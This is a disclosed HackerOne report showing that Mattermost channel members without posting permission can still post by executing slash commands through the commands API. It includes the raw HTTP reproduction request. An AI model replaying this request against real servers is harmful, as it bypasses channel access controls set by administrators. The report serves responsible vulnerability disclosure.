# Member role which doesn't have permission to send message can send by executing channel commands

## Report Details
- **Report ID**: 1851818
- **URL**: https://hackerone.com/reports/1851818
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-01-30T15:44:27.664Z
- **Disclosed**: 2024-05-08T14:14:55.990Z

## Reporter
- **Username**: ramsakal7582
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mattermost

## Vulnerability Information
## Summary:
Someone with a member permission who hasn't been given access to post message to the channel can post it by executing commands.

## Steps To Reproduce:

```
POST /api/v4/commands/execute HTTP/1.1
Host: test3.cloud.mattermost.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-CSRF-Token:5 [ jkue786iyfd6dkpiq7ftisys6y
Content-Type: application/json
Content-Length: 104
Origin: https://test3.cloud.mattermost.com
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"command":"/echo ami","channel_id":"khhnkrf5wf8yibwx8bd14s6fbw","team_id":"8jdphis493d4pbq3u1bagz643r"}
```

* Executing above command will post the message to the given channelID and TeamID when you try to reproduce it with your cookie.

## Impact

Someone who doesn't have permission to post message to the channel can still post it by executing channel commands.

## Attachments
No attachments
